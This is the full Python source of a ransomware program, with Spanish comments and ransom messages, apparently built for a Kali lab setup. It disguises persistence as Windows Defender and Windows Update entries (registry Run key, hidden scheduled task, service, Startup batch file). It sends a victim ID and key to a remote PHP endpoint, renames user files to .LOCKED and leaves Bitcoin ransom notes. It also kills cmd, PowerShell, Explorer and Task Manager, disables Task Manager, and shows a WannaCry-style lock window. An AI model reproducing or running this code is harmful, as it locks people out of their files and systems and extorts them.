import os
import sys
import random
import string
import requests
import time
import subprocess
import ctypes
import threading
import winreg
import getpass
from pathlib import Path
import tkinter as tk
from tkinter import messagebox

class RansomwarePersistente:
    def __init__(self):
        self.directories_to_encrypt = [
            '~/Documents',
            '~/Downloads', 
            '~/Desktop',
            '~/Pictures'
        ]
        self.excluded_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)',
            'System32', 'Windows.old', 'Recovery', '$Recycle.Bin'
        ]
        self.kali_ip = "10.0.2.20"
        self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        self.price = 500
        self.url = f'http://{self.kali_ip}/victima.php'
        self.encryption_count = 0
        self.password = None
        self.victim_id = None
        self.script_path = os.path.abspath(__file__)
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def show_banner(self):
        """Muestra el banner ASCII"""
        banner = """
 _nnnn_                      
dGGGGMMb     ,"""""""""""""".
@p~qp~~qMb    | Linux Rules! |
M|@||@) M|   _;..............'
|,----.JM| -'
JS^\\__/  qKL
dZP        qKRb
dZP          qKKb
fZP            SMMb
HZM            MMMM
FqM            MMMM
__| ".        |\\dS"qML
|    `.       | `' \\Zq
_)      \\.___.,|     .'
\\____   )MMMMMP|   .'
     `-'       `--' hjm
  _     __   __ ___ 
 | |    \\ \\ / /|_ _|
 | |     \\ V /  | | 
 | |___   | |   | | 
 |_____|  |_|  |___| 
==================================================
        TU INFORMACION A SIDO SECUESTRADA
==================================================
"""
        print(banner)

    def install_persistence(self):
        """Instala multiples metodos de persistencia"""
        print("[*] Instalando persistencia...")
        try:
            # Metodo 1: Registro de Windows - Run
            self._install_registry_persistence()
            # Metodo 2: Tareas Programadas
            self._install_scheduled_task()
            # Metodo 3: Carpeta Startup
            self._install_startup_folder()
            # Metodo 4: Servicio de Windows (si es admin)
            if self.is_admin():
                self._install_windows_service()
            print("[+] Persistencia instalada correctamente")
            return True
        except Exception as e:
            print("[-] Error instalando persistencia:", e)
            return False

    def _install_registry_persistence(self):
        """Instala persistencia en el registro de Windows"""
        try:
            # Current User Run
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{sys.executable}" "{self.script_path}"')
            print(" [+] Persistencia en registro (HKCU) instalada")
        except Exception as e:
            print(" [-] Error en registro HKCU:", e)

    def _install_scheduled_task(self):
        """Crea una tarea programada"""
        try:
            task_name = "WindowsDefenderUpdate"
            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Defender Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{getpass.getuser()}</UserId>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{sys.executable}"</Command>
      <Arguments>"{self.script_path}"</Arguments>
    </Exec>
  </Actions>
</Task>'''
            # Guardar XML temporalmente
            xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
            with open(xml_path, 'w') as f:
                f.write(task_xml)
            # Crear tarea
            subprocess.run([
                'schtasks', '/create', '/tn', task_name, '/xml', xml_path, '/f'
            ], capture_output=True, shell=True)
            # Limpiar
            os.remove(xml_path)
            print(" [+] Tarea programada instalada")
        except Exception as e:
            print(" [-] Error en tarea programada:", e)

    def _install_startup_folder(self):
        """Copia el script a la carpeta de inicio"""
        try:
            startup_folder = os.path.join(
                os.path.expanduser('~'),
                'AppData', 'Roaming', 'Microsoft', 'Windows',
                'Start Menu', 'Programs', 'Startup'
            )
            if os.path.exists(startup_folder):
                bat_content = f'@echo off\n"{sys.executable}" "{self.script_path}"\n'
                bat_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
                with open(bat_path, 'w') as f:
                    f.write(bat_content)
                # Ocultar archivo
                subprocess.run(f'attrib +h "{bat_path}"', shell=True, capture_output=True)
                print(" [+] Persistencia en carpeta Startup instalada")
        except Exception as e:
            print(" [-] Error en carpeta Startup:", e)

    def _install_windows_service(self):
        """Instala como servicio de Windows (requiere admin)"""
        try:
            service_name = "WindowsDefenderUpdate"
            # Usar sc para crear el servicio
            subprocess.run([
                'sc', 'create', service_name,
                f'binpath= "{sys.executable} {self.script_path}"',
                'start= auto',
                'displayname= "Windows Defender Update Service"'
            ], capture_output=True, shell=True)
            print(" [+] Servicio de Windows instalado")
        except Exception as e:
            print(" [-] Error instalando servicio:", e)

    def check_persistence(self):
        """Verifica si ya hay persistencia instalada"""
        try:
            # Verificar registro
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key:
                try:
                    value, _ = winreg.QueryValueEx(reg_key, "WindowsUpdateService")
                    if os.path.abspath(__file__) in value:
                        return True
                except FileNotFoundError:
                    pass
            return False
        except:
            return False

    def expand_paths(self):
        expanded_dirs = []
        for directory in self.directories_to_encrypt:
            expanded_path = os.path.expanduser(directory)
            if os.path.exists(expanded_path):
                expanded_dirs.append(expanded_path)
        return expanded_dirs if expanded_dirs else ['.']

    def should_encrypt(self, filepath):
        file_str = str(filepath).lower()
        for excluded in self.excluded_dirs:
            if excluded.lower() in file_str:
                return False
        try:
            if filepath.stat().st_size < 100:
                return False
        except:
            return False
        valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.avi', '.zip', '.rar', '.odt', '.ppt', '.pptx']
        return any(file_str.endswith(ext) for ext in valid_extensions)

    def generate_keys(self):
        s = string.ascii_lowercase + string.digits + string.ascii_uppercase
        self.password = ''.join(random.sample(s, 30))
        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 10))

    def test_connection(self):
        """Testea la conexion con el servidor Kali"""
        print("[*] Probando conexion con Kali Linux (" + self.kali_ip + ")...")
        try:
            result = os.system(f"ping -n 1 {self.kali_ip} >nul 2>nul")
            if result == 0:
                print("[+] Kali Linux responde al ping")
            else:
                print("[-] Kali Linux NO responde al ping")
                return False
            response = requests.get(f'http://{self.kali_ip}/victima.php', timeout=5)
            print("[+] Servidor web respondio:", response.status_code)
            return True
        except requests.exceptions.ConnectionError:
            print("[-] No se puede conectar al servidor web")
            return False
        except Exception as e:
            print("[-] Error de conexion:", e)
            return False

    def send_credentials(self):
        """Envia credenciales al servidor Kali"""
        print("[*] Enviando credenciales a " + self.url + "...")
        try:
            values = {'pass': self.password, 'id': self.victim_id}
            response = requests.post(self.url, data=values, timeout=10)
            if response.text.strip() == 'Ok.':
                print("[+] Credenciales enviadas exitosamente")
                print(" ID: " + self.victim_id)
                print(" Password: " + self.password)
                return True
            else:
                print("[-] Respuesta inesperada:", response.text)
                self.save_credentials_local()
                return False
        except Exception as e:
            print("[-] Error enviando credenciales:", e)
            self.save_credentials_local()
            return False

    def save_credentials_local(self):
        """Guarda credenciales localmente"""
        try:
            with open('CREDENCIALES_LOCALES.txt', 'w') as f:
                f.write(f"ID: {self.victim_id}\n")
                f.write(f"PASSWORD: {self.password}\n")
                f.write(f"BITCOIN: {self.bitcoin}\n")
                f.write(f"PRICE: ${self.price}\n")
            print("[+] Credenciales guardadas en CREDENCIALES_LOCALES.txt")
        except:
            pass

    def encrypt_file_windows(self, filepath):
        try:
            if not self.should_encrypt(filepath):
                return False
            new_name = str(filepath) + '.LOCKED'
            os.rename(filepath, new_name)
            self.encryption_count += 1
            return True
        except:
            return False

    def encrypt_directory(self, directory):
        encrypted_files = 0
        try:
            for root, dirs, files in os.walk(directory):
                dirs[:] = [d for d in dirs if not any(excl.lower() in os.path.join(root, d).lower() for excl in self.excluded_dirs)]
                for file in files:
                    filepath = Path(root) / file
                    if self.encrypt_file_windows(filepath):
                        encrypted_files += 1
            return encrypted_files
        except:
            return 0

    def create_ransom_note(self):
        note = f"""
================================================================
!!! SISTEMA BLOQUEADO !!!
================================================================
TU INFORMACION HA SIDO SECUESTRADA

INFORMACION PARA LA RECUPERACION:
* ID Unico: {self.victim_id}
* Pago Requerido: ${self.price} en Bitcoin
* Direccion Bitcoin: {self.bitcoin}

ADVERTENCIAS:
* EL SISTEMA SE REINICIARA AUTOMATICAMENTE SI LO APAGA
* NO REINSTALE EL SISTEMA - LA INFECCION PERSISTIRA
* NO INTENTE DESCIFRAR LOS ARCHIVOS MANUALMENTE

Para recuperar sus archivos, ingrese la clave de descifrado a continuacion:
"""
        locations = [
            os.path.expanduser('~/Desktop/LEAME_URGENTE.txt'),
            os.path.expanduser('~/Documents/INSTRUCCIONES.txt'),
            'C:/INSTRUCCIONES.txt'
        ]
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(note)
                print("[+] Nota de rescate creada en: " + location)
            except:
                pass

    def kill_system_tools(self):
        """Mata todas las herramientas del sistema"""
        tools = [
            'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe',
            'explorer.exe', 'msconfig.exe', 'compmgmt.msc', 'perfmon.exe',
            'eventvwr.exe', 'services.msc', 'control.exe', 'mmc.exe'
        ]
        for tool in tools:
            try:
                os.system(f'taskkill /f /im {tool} 2>nul')
            except:
                pass

    def disable_task_manager(self):
        """Deshabilita el administrador de tareas"""
        try:
            os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul')
        except:
            pass

    def show_ransomware_window(self):
        """Muestra la ventana de ransomware estilo WannaCry con ASCII"""
        try:
            root = tk.Tk()
            root.title("!!! WARNING !!!")
            root.attributes("-topmost", True)
            root.resizable(False, False)
            
            # Centrar ventana
            window_width = 900
            window_height = 700
            screen_width = root.winfo_screenwidth()
            screen_height = root.winfo_screenheight()
            x = (screen_width - window_width) // 2
            y = (screen_height - window_height) // 2
            root.geometry(f"{window_width}x{window_height}+{x}+{y}")
            
            # Frame principal con borde rojo
            main_frame = tk.Frame(root, bg="red", relief="raised", bd=3)
            main_frame.pack(fill="both", expand=True, padx=3, pady=3)
            
            # Contenido interno blanco
            content_frame = tk.Frame(main_frame, bg="white")
            content_frame.pack(fill="both", expand=True, padx=2, pady=2)
            
            # Header rojo
            header_frame = tk.Frame(content_frame, bg="red", height=60)
            header_frame.pack(fill="x", padx=0, pady=0)
            header_frame.pack_propagate(False)
            
            warning_label = tk.Label(
                header_frame,
                text="¡ATENCIÓN! ¡TU SISTEMA HA SIDO SECUESTRADO!",
                font=("Arial", 16, "bold"),
                fg="white",
                bg="red"
            )
            warning_label.pack(expand=True)
            
            # Arte ASCII
            ascii_frame = tk.Frame(content_frame, bg="white")
            ascii_frame.pack(fill="x", padx=20, pady=10)
            
            ascii_art = """
 _nnnn_                      
dGGGGMMb     ,"""""""""""""".
@p~qp~~qMb    | Linux Rules! |
M|@||@) M|   _;..............'
|,----.JM| -'
JS^\\__/  qKL
dZP        qKRb
dZP          qKKb
fZP            SMMb
HZM            MMMM
FqM            MMMM
__| ".        |\\dS"qML
|    `.       | `' \\Zq
_)      \\.___.,|     .'
\\____   )MMMMMP|   .'
     `-'       `--' hjm
  _     __   __ ___ 
 | |    \\ \\ / /|_ _|
 | |     \\ V /  | | 
 | |___   | |   | | 
 |_____|  |_|  |___| 
"""
            ascii_label = tk.Label(
                ascii_frame,
                text=ascii_art,
                font=("Courier New", 9),
                fg="red",
                bg="white",
                justify="left"
            )
            ascii_label.pack()
            
            # Mensaje principal
            message_frame = tk.Frame(content_frame, bg="white")
            message_frame.pack(fill="x", padx=20, pady=10)
            
            main_message = tk.Label(
                message_frame,
                text="TODOS SUS ARCHIVOS IMPORTANTES HAN SIDO CIFRADOS!\nSu sistema ha sido secuestrado y no podrá acceder a sus archivos hasta pagar el rescate.",
                font=("Arial", 12, "bold"),
                fg="black",
                bg="white",
                justify="center"
            )
            main_message.pack(pady=10)
            
            # Información de rescate
            info_frame = tk.Frame(content_frame, bg="white")
            info_frame.pack(fill="x", padx=20, pady=10)
            
            # ID único
            id_label = tk.Label(
                info_frame,
                text=f"ID ÚNICO DE VÍCTIMA: {self.victim_id}",
                font=("Arial", 10, "bold"),
                fg="red",
                bg="white"
            )
            id_label.pack(anchor="w")
            
            # Precio
            price_label = tk.Label(
                info_frame,
                text=f"RESCATE REQUERIDO: ${self.price} USD en Bitcoin",
                font=("Arial", 10, "bold"),
                fg="red",
                bg="white"
            )
            price_label.pack(anchor="w", pady=5)
            
            # Dirección Bitcoin
            btc_label = tk.Label(
                info_frame,
                text=f"DIRECCIÓN BITCOIN: {self.bitcoin}",
                font=("Courier New", 9),
                fg="blue",
                bg="white"
            )
            btc_label.pack(anchor="w", pady=2)
            
            # Frame de entrada de clave
            input_frame = tk.Frame(content_frame, bg="white")
            input_frame.pack(fill="x", padx=20, pady=20)
            
            input_label = tk.Label(
                input_frame,
                text="Si ya ha pagado, ingrese la clave de descifrado:",
                font=("Arial", 11),
                fg="black",
                bg="white"
            )
            input_label.pack(anchor="w", pady=5)
            
            # Entrada de clave
            self.password_var = tk.StringVar()
            password_entry = tk.Entry(
                input_frame,
                textvariable=self.password_var,
                font=("Arial", 12),
                width=50,
                show="*",
                relief="solid",
                bd=2
            )
            password_entry.pack(fill="x", pady=10)
            password_entry.focus()
            
            # Botones
            button_frame = tk.Frame(content_frame, bg="white")
            button_frame.pack(fill="x", padx=20, pady=10)
            
            verify_btn = tk.Button(
                button_frame,
                text="VERIFICAR CLAVE",
                font=("Arial", 11, "bold"),
                bg="red",
                fg="white",
                command=lambda: self.verify_decryption_key(root),
                width=20,
                height=2
            )
            verify_btn.pack(side="left", padx=5)
            
            # Advertencias
            warning_frame = tk.Frame(content_frame, bg="yellow")
            warning_frame.pack(fill="x", padx=20, pady=10)
            
            warnings = tk.Label(
                warning_frame,
                text="ADVERTENCIA:\n• No reinicie el sistema - La infección persistirá\n• No reinstale Windows - Perderá sus archivos permanentemente\n• No intente descifrar manualmente - Los dañará irreversiblemente",
                font=("Arial", 9),
                fg="red",
                bg="yellow",
                justify="left"
            )
            warnings.pack(pady=5)
            
            # Tiempo transcurrido
            self.counter = 0
            time_frame = tk.Frame(content_frame, bg="white")
            time_frame.pack(fill="x", padx=20, pady=5)
            
            self.time_label = tk.Label(
                time_frame,
                text="Tiempo transcurrido: 0 segundos",
                font=("Arial", 9),
                fg="gray",
                bg="white"
            )
            self.time_label.pack(anchor="e")
            
            # Iniciar contador
            self.update_counter(root)
            
            # Vincular Enter a verificación
            password_entry.bind('<Return>', lambda e: self.verify_decryption_key(root))
            
            root.mainloop()
            
        except Exception as e:
            print(f"Error mostrando ventana: {e}")

    def verify_decryption_key(self, root):
        """Verifica si la clave de descifrado es correcta"""
        entered_password = self.password_var.get()
        if entered_password == self.password:
            messagebox.showinfo("ÉXITO", "Clave correcta! Iniciando proceso de descifrado...")
            root.destroy()
            self.start_decryption()
        else:
            messagebox.showerror("ERROR", "Clave incorrecta. El sistema permanece bloqueado.")
            self.password_var.set("")

    def update_counter(self, root):
        """Actualiza el contador de tiempo"""
        self.counter += 1
        if hasattr(self, 'time_label'):
            self.time_label.config(text=f"Tiempo transcurrido: {self.counter} segundos")
        root.after(1000, lambda: self.update_counter(root))

    def start_decryption(self):
        """Inicia el proceso de descifrado"""
        try:
            # Ejecutar el script de descifrado
            decrypt_script = f'''
import os
import winreg
import subprocess

VICTIM_ID = "{self.victim_id}"
PASSWORD = "{self.password}"

def main():
    print("Sistema de Recuperación de Archivos")
    print("===================================")
    print(f"ID de víctima: {{VICTIM_ID}}")
    
    # Descifrar archivos
    encrypted_files = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith('.LOCKED'):
                encrypted_files.append(os.path.join(root, file))
    
    success_count = 0
    for enc_file in encrypted_files:
        try:
            original_file = enc_file[:-7]  # Remover .LOCKED
            os.rename(enc_file, original_file)
            success_count += 1
            print(f"[+] Recuperado: {{os.path.basename(original_file)}}")
        except Exception as e:
            print(f"[-] Error con {{os.path.basename(enc_file)}}: {{e}}")
    
    # Remover persistencia
    print("\\n[*] Removiendo persistencia...")
    try:
        # Remover del registro
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            try:
                winreg.DeleteValue(reg_key, "WindowsUpdateService")
                print("[+] Persistencia del registro removida")
            except:
                pass
        
        # Remover tarea programada
        os.system('schtasks /delete /tn "WindowsDefenderUpdate" /f 2>nul')
        print("[+] Tarea programada removida")
        
        # Remover archivos temporales
        files_to_remove = ["LEAME_URGENTE.txt", "INSTRUCCIONES.txt", "CREDENCIALES_LOCALES.txt"]
        for file in files_to_remove:
            if os.path.exists(file):
                os.remove(file)
                print(f"[+] Archivo {{file}} removido")
                
    except Exception as e:
        print(f"[-] Error removiendo persistencia: {{e}}")
    
    print(f"\\n[+] Proceso completado!")
    print(f"[*] Archivos recuperados: {{success_count}}/{{len(encrypted_files)}}")
    print("\\n[+] Sistema completamente recuperado y limpio!")
    input("Presione Enter para salir...")

if __name__ == "__main__":
    main()
'''
            with open('DECRYPT_FILES.py', 'w') as f:
                f.write(decrypt_script)
                
            subprocess.Popen([sys.executable, 'DECRYPT_FILES.py'])
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo iniciar el descifrado: {e}")

    def execute_complete_lockdown(self):
        """Ejecuta el bloqueo completo del sistema"""
        self.show_banner()
        print("[*] INICIANDO BLOQUEO COMPLETO PERSISTENTE")
        print("=" * 50)
        
        # Verificar si ya está instalado
        if self.check_persistence():
            print("[*] El ransomware ya está instalado en el sistema")
            print("[*] Activando modo de ejecución persistente...")
        else:
            # Instalar persistencia en la primera ejecución
            print("[*] Instalando persistencia...")
            self.install_persistence()

        # Paso 1: Configurar conexión
        print("\\n[1/5] Configurando conexión...")
        connection_ok = self.test_connection()
        
        # Continuar automáticamente sin conexión
        if not connection_ok:
            print("[*] Continuando sin conexión al servidor...")

        # Paso 2: Generar claves
        print("\\n[2/5] Generando claves...")
        self.generate_keys()

        # Paso 3: Enviar credenciales
        if connection_ok:
            print("\\n[3/5] Enviando credenciales...")
            self.send_credentials()
        else:
            print("\\n[3/5] Guardando credenciales localmente...")
            self.save_credentials_local()

        # Paso 4: Cifrar archivos
        print("\\n[4/5] Cifrando archivos...")
        directories = self.expand_paths()
        total_encrypted = 0
        for directory in directories:
            encrypted = self.encrypt_directory(directory)
            total_encrypted += encrypted
            print(" " + directory + ": " + str(encrypted) + " archivos")

        # Paso 5: Bloquear sistema CON VENTANA WANNACRY
        print("\\n[5/5] Activando bloqueo completo con ventana WannaCry...")
        self.create_ransom_note()
        self.kill_system_tools()
        self.disable_task_manager()
        
        print("[+] SISTEMA BLOQUEADO PERSISTENTEMENTE")
        print("[*] Archivos cifrados: " + str(total_encrypted))
        print("[*] Clave: " + self.password)
        print("[*] El sistema se reactivará automáticamente tras reinicios")
        
        # Mostrar ventana principal
        self.show_ransomware_window()

if __name__ == "__main__":
    ransomware = RansomwarePersistente()
    try:
        ransomware.execute_complete_lockdown()
    except KeyboardInterrupt:
        print("\\n[*] Ejecución interrumpida")
    except Exception as e:
        print("\\n[-] Error:", e)
